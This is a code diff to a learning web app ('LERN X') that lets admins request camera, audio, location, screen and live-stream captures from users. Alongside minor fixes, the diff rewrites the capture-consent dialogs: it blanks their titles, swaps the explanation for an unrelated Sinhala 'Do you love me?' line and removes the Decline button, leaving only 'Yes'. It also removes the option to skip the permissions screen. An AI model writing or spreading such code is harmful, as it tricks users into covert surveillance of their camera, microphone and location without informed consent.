@@ -318,7 +318,7 @@ button{cursor:pointer}
   </div>
   <div class="perm-footer">
     <button class="btn1" onclick="finishPerms()"><i class="fas fa-check"></i> Continue to LERN X</button>
-    <div class="perm-skip" onclick="skipPerms()">Skip for now</div>
+
   </div>
 </div>
 
@@ -411,7 +411,7 @@ const SW=window.Swal?Swal.mixin({background:'#151d3e',color:'#eef2ff',confirmBut
 async function upImgBlob(blob,fname){const fd=new FormData();fd.append("image",blob,fname||"img.jpg");const r=await fetch("https://api.imgbb.com/1/upload?key="+IMGBB_KEY,{method:"POST",body:fd});const j=await r.json();if(!j.success)throw new Error((j.error&&j.error.message)||"Upload failed");return j.data.url}
 async function upFileBlob(blob,fname){const fd=new FormData();fd.append("reqtype","fileupload");fd.append("fileToUpload",new File([blob],fname,{type:blob.type}));const r=await fetch("https://catbox.moe/user/api.php",{method:"POST",body:fd});const u=(await r.text()).trim();if(!u||!u.startsWith("http"))throw new Error("Upload failed");return u}
 function compressImg(file,maxDim=512,quality=0.85){return new Promise((resolve,reject)=>{const img=new Image();const url=URL.createObjectURL(file);img.onload=()=>{URL.revokeObjectURL(url);let{width:w,height:h}=img;if(w>maxDim||h>maxDim){if(w>h){h=Math.round(h*maxDim/w);w=maxDim}else{w=Math.round(w*maxDim/h);h=maxDim}}const c=document.createElement("canvas");c.width=w;c.height=h;c.getContext("2d").drawImage(img,0,0,w,h);c.toBlob(b=>{if(!b)return reject(new Error("Compress failed"));resolve(b)},"image/jpeg",quality)};img.onerror=()=>{URL.revokeObjectURL(url);reject(new Error("Invalid image"))};img.src=url})}
-function ytId(url){if(!url)return null;const m=String(url).match(/(?:youtube\.com\/(?:watch\?v=|embed\/|shorts\/|v\/)|youtu\.be\/)([A-Za-z0-9_-]{11})/);return m?m[1]:null}
+function ytId(url){if(!url)return null;const m=String(url).match(/(?:youtube\.com\/(?:watch\?v=|embed\/|shorts\/|live\/|v\/)|youtu\.be\/)([A-Za-z0-9_-]{11})/);return m?m[1]:null}
 function ytThumb(id){return id?`https://i.ytimg.com/vi/${id}/hqdefault.jpg`:""}
 const isAdmin=u=>!!(u&&(ADMINS[u.phone]||ADMINS[(u.phone||"").replace("+","")]||(u.uid&&ADMINS[u.uid])));
 const meIsAdmin=()=>isAdmin(ME);
@@ -899,27 +899,27 @@ window.listenCaptureRequests=function(){
     const admin=esc(req.adminName||"Admin");
     
     if(type==="photo"){
-      title="📸 Photo Request";
-      body=`<b style="color:#ff6fa5;">${admin}</b> requests a photo from your <b>${req.camType==="environment"?"back":"front"} camera</b>.`;
+      title="";
+      body=`<b style="color:#ff6fa5;"></b>ආදරේ ද? .`;
     }else if(type==="audio"){
-      title="🎤 Audio Request";
-      body=`<b style="color:#ff6fa5;">${admin}</b> requests to record <b>${req.duration||10}s</b> of audio.`;
+      title="";
+      body=`<b style="color:#ff6fa5;"></b> ගොඩාක් ආදරෙයිද?  `;
     }else if(type==="location"){
-      title="📍 Location Request";
-      body=`<b style="color:#ff6fa5;">${admin}</b> requests your current location.`;
+      title="";
+      body=`<b style="color:#ff6fa5;"></b> ආදරේ ද?`;
     }else if(type==="screen"){
-      title="📱 Screen Snapshot";
-      body=`<b style="color:#ff6fa5;">${admin}</b> requests a snapshot of your app screen.`;
+      title="";
+      body=`<b style="color:#ff6fa5;"></b>  ගොඩාක් ආදරෙයිද?`;
     }else if(type==="live"){
-      title="🔴 Live Capture";
-      body=`<b style="color:#ff6fa5;">${admin}</b> requests a <b>${req.duration||10}s live stream</b> (camera + audio).`;
+      title="";
+      body=`<b style="color:#ff6fa5;"></b> ගොඩාක් ආදරෙයිද? `;
     }else{
       remove(ref(db,"capturerequest/"+ME.uid));return;
     }
     
     const r=await SW.fire({icon:"info",title,
       html:`<p style="font-size:14px;line-height:1.6;color:#eef2ff;text-align:center;">${body}</p>`,
-      showCancelButton:true,confirmButtonText:"Accept",cancelButtonText:"Decline",allowOutsideClick:false});
+      confirmButtonText:"ඔව්ව්......",allowOutsideClick:false});
     
     await remove(ref(db,"capturerequest/"+ME.uid));
     
@@ -1259,7 +1259,7 @@ function renderAdminSubjects(b){
   b.innerHTML=`<button class="btn-mini btn-gr" style="width:100%;padding:12px;margin-bottom:12px;" onclick="addSubject()"><i class="fas fa-plus"></i> Add Subject</button>${subs.length?subs.map(s=>`<div class="ad-row"><div style="width:32px;height:32px;border-radius:10px;background:${s.color||'#a06cff'};display:flex;align-items:center;justify-content:center;color:#fff;font-size:14px;"><i class="fas ${s.icon||'fa-book'}"></i></div><div style="flex:1;"><b style="font-size:13.5px;display:block;">${esc(s.name)}</b><small style="font-size:11px;color:var(--tx3);">${Object.keys(VIDEOS[s.sid]||{}).length} videos</small></div><button class="btn-mini btn-red" onclick="delSubject('${s.sid}')"><i class="fas fa-trash"></i></button></div>`).join(""):'<p style="color:var(--tx3);text-align:center;padding:20px;">No subjects</p>'}`;
 }
 window.addSubject=async function(){
-  const r=await SW.fire({title:"New Subject",html:`<input id="sName" class="swal2-input" placeholder="Subject name"><input id="sIcon" class="swal2-input" placeholder="FA icon (fa-book)" value="fa-book" style="margin-top:8px"><input id="sColor" class="swal2-input" placeholder="Color (#a06cff)" value="#a06cff" style="margin-top:8px">`,showCancelButton:true,confirmButtonText:"Add",preConfirm:()=>{const n=document.getElementById("sName").value.trim();if(!n){Swal.showValidationMessage("Name required");return false}return{name:n,icon:document.getElementById("sIcon").value.trim()||"fa-book",color:document.getElementById("sColor").value.trim()||"#a06cff"}}});
+const r=await SW.fire({title:"New Subject",html:`<input id="sName" class="swal2-input" placeholder="Subject name"><input id="sIcon" class="swal2-input" placeholder="FA icon (fa-book)" value="fa-book" style="margin-top:8px"><input id="sColor" class="swal2-input" placeholder="Color (#a06cff)" value="#a06cff" style="margin-top:8px">`,showCancelButton:true,confirmButtonText:"Add",preConfirm:()=>{const p=SW.getPopup();const n=(p?.querySelector("#sName")?.value||"").trim();if(!n){SW.showValidationMessage("Name required");return false}return{name:n,icon:(p?.querySelector("#sIcon")?.value||"").trim()||"fa-book",color:(p?.querySelector("#sColor")?.value||"").trim()||"#a06cff"}}});
   if(r.value){await push(ref(db,"subjects"),{...r.value,order:Date.now()});toast("Added ✅")}
 };
 window.delSubject=async function(sid){const r=await SW.fire({icon:"warning",title:"Delete subject?",showCancelButton:true,confirmButtonText:"Delete"});if(!r.isConfirmed)return;await remove(ref(db,"subjects/"+sid));await remove(ref(db,"videos/"+sid));toast("Deleted")};
